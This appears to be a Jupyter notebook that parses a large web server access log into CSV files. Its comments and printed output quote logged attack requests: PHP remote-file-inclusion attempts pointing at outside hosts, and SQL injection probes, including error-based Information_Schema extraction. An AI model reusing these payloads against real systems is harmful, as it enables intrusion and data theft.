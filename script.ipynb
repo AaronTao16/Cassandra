{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 18,
   "metadata": {},
   "outputs": [
    {
     "ename": "IndexError",
     "evalue": "list index out of range",
     "output_type": "error",
     "traceback": [
      "\u001b[1;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[1;31mIndexError\u001b[0m                                Traceback (most recent call last)",
      "\u001b[1;32mC:\\Users\\ADMINI~1\\AppData\\Local\\Temp/ipykernel_22436/1439525120.py\u001b[0m in \u001b[0;36m<module>\u001b[1;34m\u001b[0m\n\u001b[0;32m     25\u001b[0m             \u001b[0mmethod\u001b[0m \u001b[1;33m=\u001b[0m \u001b[0mreq\u001b[0m\u001b[1;33m[\u001b[0m\u001b[1;36m0\u001b[0m\u001b[1;33m]\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m     26\u001b[0m             \u001b[0murl\u001b[0m \u001b[1;33m=\u001b[0m \u001b[0mreq\u001b[0m\u001b[1;33m[\u001b[0m\u001b[1;36m1\u001b[0m\u001b[1;33m]\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[1;32m---> 27\u001b[1;33m             \u001b[0mprotocol\u001b[0m \u001b[1;33m=\u001b[0m \u001b[0mreq\u001b[0m\u001b[1;33m[\u001b[0m\u001b[1;36m2\u001b[0m\u001b[1;33m]\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0m\u001b[0;32m     28\u001b[0m \u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m     29\u001b[0m             \u001b[0mres\u001b[0m \u001b[1;33m=\u001b[0m \u001b[0mline\u001b[0m\u001b[1;33m[\u001b[0m\u001b[1;36m2\u001b[0m\u001b[1;33m]\u001b[0m\u001b[1;33m.\u001b[0m\u001b[0mstrip\u001b[0m\u001b[1;33m(\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m.\u001b[0m\u001b[0msplit\u001b[0m\u001b[1;33m(\u001b[0m\u001b[1;34m\" \"\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n",
      "\u001b[1;31mIndexError\u001b[0m: list index out of range"
     ]
    }
   ],
   "source": [
    "index = 1\n",
    "list = []\n",
    "with open('access_log','r', encoding='UTF-8') as f:\n",
    "    with open('access_log.csv', 'w', encoding='UTF-8') as wf:\n",
    "        wf.write(\"ip|time_stamp|req_method|req_url|req_protocol|res_status_code|res_size\\n\")\n",
    "        for line in f:\n",
    "            # if index == 382520: break\n",
    "            backup = line\n",
    "            line = line.strip(\"\\n\").split(\"[\")\n",
    "            if len(line) > 2:\n",
    "                # list.append(index)\n",
    "                list.append(backup)\n",
    "                special_operation(wf, backup)\n",
    "                index += 1\n",
    "                continue\n",
    "            ip = line[0].split(\" \")[0]\n",
    "            line = line[1].split(\"]\")\n",
    "            time = line[0]\n",
    "\n",
    "            line = line[1].split('\"')\n",
    "            \n",
    "            \n",
    "            req = line[1].split(\" \")\n",
    "            \n",
    "            method = req[0]\n",
    "            url = req[1]\n",
    "            protocol = req[2]\n",
    "\n",
    "            res = line[2].strip().split(\" \")\n",
    "            code = res[0]\n",
    "            size = res[1]\n",
    "            wf.write(ip + \"|\" + time + \"|\" + method + \"|\" + url + \"|\" + protocol + \"|\" + code + \"|\" +  size + \"\\n\")\n",
    "            index += 1\n",
    "\n",
    "# 10.57.202.243 - - [14/Jan/2010:08:22:38 -0800] \"GET //?_SERVER[DOCUMENT_ROOT]=http://83.143.148.154:32000/accounts/inc/.vsh/index1.txt? HTTP/1.1\" 200 15649 -- 98552\n",
    "# 10.76.84.212 - - [25/Mar/2010:14:11:47 -0700] \"GET /printable.php?id=46%20%20////?_SERVER[DOCUMENT_ROOT]=http://ouestpleinair.com/zfxid1.txt??%20? HTTP/1.1\" 302 -\n",
    "# 10.76.84.212 - - [25/Mar/2010:14:11:47 - 0700] \"GET ////?_SERVER[DOCUMENT_ROOT]=http://ouestpleinair.com/zfxid1.txt??%20? HTTP/1.1\" 200 15564\n",
    "# \n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "metadata": {},
   "outputs": [],
   "source": [
    "backupList = []\n",
    "\n",
    "def special_operation(wf, line):\n",
    "    backup = line\n",
    "    line = line.split('\"')\n",
    "    ip = line[0].split(\"[\")[0].split(\" \")[0]\n",
    "    time = line[0].split(\"[\")[1].strip(\" ]\")\n",
    "\n",
    "    req = line[1].split(\" \")\n",
    "    if len(req) < 3:\n",
    "        # list.append(index)\n",
    "        backupList.append(backup)\n",
    "        # special_operation2(wf, backup)\n",
    "        # index += 1\n",
    "        return\n",
    "\n",
    "    method = req[0]\n",
    "    url = req[1]\n",
    "    protocol = req[2]\n",
    "\n",
    "    res = line[2].strip().split(\" \")\n",
    "    code = res[0]\n",
    "    size = res[1]\n",
    "    wf.write(ip + \"|\" + time + \"|\" + method + \"|\" + url + \"|\" + protocol + \"|\" + code + \"|\" +  size + \"\\n\")\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "['10.213.155.34 - - [28/Aug/2010:15:55:44 -0700] \"GET /displaytitle.php?id=361\\\\\"%20and%20\\\\\"x\\\\\"=\\\\\"x HTTP/1.1\" 302 -\\n', '10.213.155.34 - - [28/Aug/2010:15:55:44 -0700] \"GET /displaytitle.php?id=361\\\\\"%20and%20\\\\\"x\\\\\"=\\\\\"y HTTP/1.1\" 302 -\\n', '10.36.24.176 - - [27/Jan/2011:03:36:56 -0800] \"GET /displaytitle.php?id=241\\\\\"%20and%20\\\\\"x\\\\\"=\\\\\"x HTTP/1.1\" 302 -\\n', '10.36.24.176 - - [27/Jan/2011:03:36:56 -0800] \"GET /displaytitle.php?id=241\\\\\"%20and%20\\\\\"x\\\\\"=\\\\\"y HTTP/1.1\" 302 -\\n', '10.228.20.220 - - [22/Jun/2011:17:56:12 -0700] \"GET /displaytitle.php?id=361\\\\\"%20and%20\\\\\"x\\\\\"=\\\\\"x HTTP/1.1\" 302 -\\n', '10.228.20.220 - - [22/Jun/2011:17:56:12 -0700] \"GET /displaytitle.php?id=361\\\\\"%20and%20\\\\\"x\\\\\"=\\\\\"y HTTP/1.1\" 302 -\\n', '10.228.20.220 - - [23/Jun/2011:04:05:58 -0700] \"GET /printable.php?id=580\\\\\"%20and%20\\\\\"x\\\\\"=\\\\\"x HTTP/1.1\" 302 -\\n', '10.228.20.220 - - [23/Jun/2011:04:06:01 -0700] \"GET /printable.php?id=580\\\\\"%20and%20\\\\\"x\\\\\"=\\\\\"y HTTP/1.1\" 302 -\\n', '10.34.50.228 - - [14/Jul/2011:10:16:15 -0700] \"GET /printable.php?id=580\\\\\"%20and%20\\\\\"x\\\\\"=\\\\\"x HTTP/1.1\" 302 -\\n', '10.34.50.228 - - [14/Jul/2011:10:16:15 -0700] \"GET /printable.php?id=580\\\\\"%20and%20\\\\\"x\\\\\"=\\\\\"y HTTP/1.1\" 302 -\\n', '10.229.163.35 - - [17/Aug/2011:23:34:25 -0700] \"GET /images/filmmediablock/469/Battle_Royale_5.jpg\\\\\"%20width=\\\\\"88\\\\\"%20height=\\\\\"50\\\\\"%20alt=\\\\\"image\\\\\"/></a>%20</div>%20<div%20class=\\\\\"c0%20r\\\\\"><a%20href=\\\\\"/m/imgres?q=christmas+meadow+corporation+printable HTTP/1.1\" 404 286\\n', '10.34.60.9 - - [15/Sep/2011:04:46:20 -0700] \"GET /printable.php?id=292%20\\\\\"%20Order%20By%201%20--%20a HTTP/1.1\" 302 -\\n', '10.34.60.9 - - [15/Sep/2011:04:46:20 -0700] \"GET /printable.php?id=292%20\\\\\"%20Order%20By%209999%20--%20a HTTP/1.1\" 302 -\\n', '10.34.60.9 - - [15/Sep/2011:04:46:21 -0700] \"GET /printable.php?id=292%20\\\\\"%20Order%20By%2010000%20--%20a HTTP/1.1\" 302 -\\n', '10.34.60.9 - - [15/Sep/2011:04:46:21 -0700] \"GET /printable.php?id=292\\\\\"%20And%20(Select%201%20From(Select%20Count(*),Concat(CHAR%20(58,58,58),(Version()),floor(rAnd(0)*2),CHAR%20(58,58,58))x%20From%20Information_Schema.%20Tables%20Group%20By%20x)a)%20--%20a HTTP/1.1\" 302 -\\n', '10.34.60.9 - - [15/Sep/2011:04:46:22 -0700] \"GET /printable.php?id=292%20\\\\\"%20Order%20By%201%20--%20a HTTP/1.1\" 302 -\\n', '10.34.60.9 - - [15/Sep/2011:04:46:22 -0700] \"GET /printable.php?id=292%20\\\\\"%20Order%20By%209999%20--%20a HTTP/1.1\" 302 -\\n', '10.34.60.9 - - [15/Sep/2011:04:46:22 -0700] \"GET /printable.php?id=292%20\\\\\"%20Order%20By%2010000%20--%20a HTTP/1.1\" 302 -\\n', '10.34.60.9 - - [15/Sep/2011:04:46:22 -0700] \"GET /printable.php?id=292\\\\\"/*!%20And%20(Select%201%20From(Select%20Count(*),Concat(CHAR%20(58,58,58),(Version()),floor(rAnd(0)*2),CHAR%20(58,58,58))x%20From%20Information_Schema.%20Tables%20Group%20By%20x)a)%20*/--%20a HTTP/1.1\" 302 -\\n', '10.34.60.9 - - [15/Sep/2011:04:46:23 -0700] \"GET /printable.php?id=292\\\\\"%20And%20(Select%201%20From(Select%20Count(*),Concat(CHAR%20(58,58,58),(Version()),floor(rAnd(0)*2),CHAR%20(58,58,58))x%20From%20Information_Schema.%20Tables%20Group%20By%20x)a)%20--%20a HTTP/1.1\" 302 -\\n', '10.34.60.9 - - [15/Sep/2011:04:46:23 -0700] \"GET /printable.php?id=292\\\\\"/*!%20And%20(Select%201%20From(Select%20Count(*),Concat(CHAR%20(58,58,58),(Version()),floor(rAnd(0)*2),CHAR%20(58,58,58))x%20From%20Information_Schema.%20Tables%20Group%20By%20x)a)%20*/--%20a HTTP/1.1\" 302 -\\n', '10.2.86.65 - - [19/Sep/2011:02:07:38 -0700] \"GET /printable.php?id=370\\\\\"%20And%20(Select%201%20From(Select%20Count(*),Concat(CHAR%20(58,58,58),(Version()),floor(rAnd(0)*2),CHAR%20(58,58,58))x%20From%20Information_Schema.%20Tables%20Group%20By%20x)a)%20--%20a HTTP/1.1\" 302 -\\n', '10.34.60.9 - - [19/Sep/2011:02:07:44 -0700] \"GET /printable.php?id=370%20\\\\\"%20Order%20By%201%20--%20a HTTP/1.1\" 302 -\\n', '10.34.60.9 - - [19/Sep/2011:02:07:44 -0700] \"GET /printable.php?id=370%20\\\\\"%20Order%20By%209999%20--%20a HTTP/1.1\" 302 -\\n', '10.34.60.9 - - [19/Sep/2011:02:07:44 -0700] \"GET /printable.php?id=370%20\\\\\"%20Order%20By%2010000%20--%20a HTTP/1.1\" 302 -\\n', '10.34.60.9 - - [19/Sep/2011:02:07:45 -0700] \"GET /printable.php?id=370\\\\\"%20And%20(Select%201%20From(Select%20Count(*),Concat(CHAR%20(58,58,58),(Version()),floor(rAnd(0)*2),CHAR%20(58,58,58))x%20From%20Information_Schema.%20Tables%20Group%20By%20x)a)%20--%20a HTTP/1.1\" 302 -\\n', '10.34.60.9 - - [19/Sep/2011:02:07:46 -0700] \"GET /printable.php?id=370\\\\\"/*!%20And%20(Select%201%20From(Select%20Count(*),Concat(CHAR%20(58,58,58),(Version()),floor(rAnd(0)*2),CHAR%20(58,58,58))x%20From%20Information_Schema.%20Tables%20Group%20By%20x)a)%20*/--%20a HTTP/1.1\" 302 -\\n']\n"
     ]
    }
   ],
   "source": [
    "print(backupList)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 24,
   "metadata": {},
   "outputs": [],
   "source": [
    "def process_log(start, end, i):\n",
    "    index = 1\n",
    "    with open('access_log', 'r', encoding='UTF-8') as f:\n",
    "        with open('access_log_'+str(i)+'.csv', 'w', encoding='UTF-8') as wf:\n",
    "            wf.write(\"id ip time_stamp req_method req_url req_protocol res_status_code res_size\\n\")\n",
    "            # wf.write(\"ip req_url\\n\")\n",
    "            for line in f:\n",
    "                if index < start:\n",
    "                    index += 1\n",
    "                    continue\n",
    "                if index > end:\n",
    "                    break\n",
    "                line = line.split(\" \")\n",
    "                ip = line[0].strip()\n",
    "                time = line[3].strip(' []') + line[4].strip(' []')\n",
    "\n",
    "                method = line[5].strip(' \"')\n",
    "                url = line[6].strip(\" []\")\n",
    "                protocol = line[7].strip(' []\"')\n",
    "\n",
    "                code = line[8].strip()\n",
    "                size = line[9].strip()\n",
    "\n",
    "                wf.write(str(index) + \" \" + (\"NULL\" if ip == \"\" else ip) + \" \" + (\"NULL\" if time == \"\" else time) + \" \" +\n",
    "                         (\"NULL\" if method == \"\" else method) + \" \" + (\"NULL\" if url == \"\" else url) + \" \" + (\"NULL\" if protocol == \"\" else protocol) + \" \" + (\"NULL\" if code == \"\" else code) + \" \" + (\"0\" if size == \"-\" else size) + \"\\n\")\n",
    "                        \n",
    "                # wf.write((\"NULL\" if ip == \"\" else ip) + \" \" + (\"NULL\" if url == \"\" else url) + \"\\n\")\n",
    "                index += 1\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 25,
   "metadata": {},
   "outputs": [],
   "source": [
    "process_log(1, 1500000, 1)\n",
    "process_log(1500001, 3000000, 2)\n",
    "process_log(3000001, 4477842, 3)\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [],
   "source": [
    "index = 1\n",
    "with open('access_log', 'r', encoding='UTF-8') as f:\n",
    "    with open('access_log.csv', 'w', encoding='UTF-8') as wf:\n",
    "        # wf.write(\"ip req_url\\n\")\n",
    "        wf.write(\"id ip time_stamp req_method req_url req_protocol res_status_code res_size\\n\")\n",
    "\n",
    "        for line in f:\n",
    "            line = line.split(\" \")\n",
    "            ip = line[0].strip()\n",
    "            time = line[3].strip(' []') + line[4].strip(' []')\n",
    "\n",
    "            method = line[5].strip(' \"')\n",
    "            url = line[6].strip(\" []\")\n",
    "            protocol = line[7].strip(' []\"')\n",
    "\n",
    "            code = line[8].strip()\n",
    "            size = line[9].strip()\n",
    "\n",
    "            # wf.write((\"NULL\" if ip == \"\" else ip) + \" \" + (\"NULL\" if url == \"\" else url) + \"\\n\")\n",
    "            wf.write(str(index) + \" \" + (\"NULL\" if ip == \"\" else ip) + \" \" + (\"NULL\" if time == \"\" else time) + \" \" +\n",
    "                         (\"NULL\" if method == \"\" else method) + \" \" + (\"NULL\" if url == \"\" else url) + \" \" + (\"NULL\" if protocol == \"\" else protocol) + \" \" + (\"NULL\" if code == \"\" else code) + \" \" + (\"0\" if size == \"-\" else size) + \"\\n\")\n",
    "            index += 1\n",
    "            "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "interpreter": {
   "hash": "96eb50e1d44aed467dc8f759cb08c32fbfa9babcf79c554e2d0e5feb04653a10"
  },
  "kernelspec": {
   "display_name": "Python 3.8.12 ('base')",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.12"
  },
  "orig_nbformat": 4
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
